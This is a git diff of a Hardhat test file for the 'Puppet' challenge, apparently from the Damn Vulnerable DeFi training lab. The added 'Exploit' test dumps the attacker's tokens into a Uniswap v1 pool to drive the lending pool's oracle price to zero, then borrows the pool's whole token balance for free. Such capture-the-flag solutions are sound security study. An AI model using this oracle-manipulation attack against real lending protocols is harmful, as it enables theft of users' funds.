@@ -1,7 +1,7 @@
 import { ethers } from "hardhat";
 import { expect } from "chai";
 import { BigNumber } from "ethers";
-import { contract, accounts as ozAccounts } from "@openzeppelin/test-environment";
+import { contract, accounts as ozAccounts, accounts } from "@openzeppelin/test-environment";
 
 
 // Hacky way to easily get the Uniswap v1 contracts as artifacts
@@ -42,6 +42,7 @@ describe('[Challenge] Puppet', function () {
 
     before(async function () {
         /** SETUP SCENARIO */
+        const providerAcc = (await ethers.getSigners())[5];
         
         // Deploy token to be traded in Uniswap
         this.token = await DamnValuableToken.new({ from: deployer });
@@ -70,7 +71,7 @@ describe('[Challenge] Puppet', function () {
             UNISWAP_INITIAL_TOKEN_RESERVE,
             { from: deployer }
         );
-        const deadline = (await ethers.getDefaultProvider().getBlock('latest')).timestamp * 2;
+        const deadline = (await providerAcc.provider!.getBlock('latest')).timestamp * 2;
         await this.uniswapExchange.addLiquidity(
             0, // min_liquidity
             UNISWAP_INITIAL_TOKEN_RESERVE,
@@ -100,30 +101,66 @@ describe('[Challenge] Puppet', function () {
             (await this.lendingPool.computeOraclePrice()).toString()
         ).to.be.eq('1');
 
+
         // Track attacker's initial ETH balance (to ensure it doesn't decrease)
-        this.intialAttackerEthBalance = await ethers.getDefaultProvider().getBalance(attacker); 
+        this.intialAttackerEthBalance = await providerAcc.provider!.getBalance(attacker); 
 
     });
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const providerAcc = (await ethers.getSigners())[5];
+
+        /*
+         * computeOraclePrice = uniswap.eth / uniswap.dvt
+         */
+
+        let dvtPrice = await this.lendingPool.computeOraclePrice();
+        console.log("DVT price: " + dvtPrice.toString());
+
+        // swap DVT's for ETH to decrease DVT price
+        let tx = await this.token.approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITAL_TOKEN_BALANCE,
+            { from: attacker }
+        );
+        console.log(tx);
+
+        let deadline = (await providerAcc.provider!.getBlock('latest')).timestamp * 2;
+        tx = await this.uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITAL_TOKEN_BALANCE,
+            1,
+            deadline,
+            { from: attacker }
+        );
+        console.log(tx);
+
+        // DVT price should be 0
+        dvtPrice = await this.lendingPool.computeOraclePrice();
+        console.log("DVT price: " + dvtPrice.toString());
+        expect(dvtPrice.toString()).to.eq('0');
+
+        // borrow DVTs for free
+        tx = await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { from: attacker });
+        console.log(tx);
     });
 
     after(async function () {
         /** SUCCESS CONDITION */
-        
+        const providerAcc = (await ethers.getSigners())[5];
+
         // Attacker has stolen all tokens from the pool
         expect(
             BigNumber.from((await this.token.balanceOf(attacker)).toString())
         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
 
         expect(
-            await this.token.balanceOf(this.lendingPool.address)
+            BigNumber.from((await this.token.balanceOf(this.lendingPool.address)).toString())
         ).to.be.eq(0);
 
         // Attacker ETH balance has not decreased
         expect(
-            BigNumber.from((await ethers.getDefaultProvider().getBalance(attacker)).toString())
+            BigNumber.from((await providerAcc.provider!.getBalance(attacker)).toString())
         ).to.be.gte(this.intialAttackerEthBalance);
     });
 });
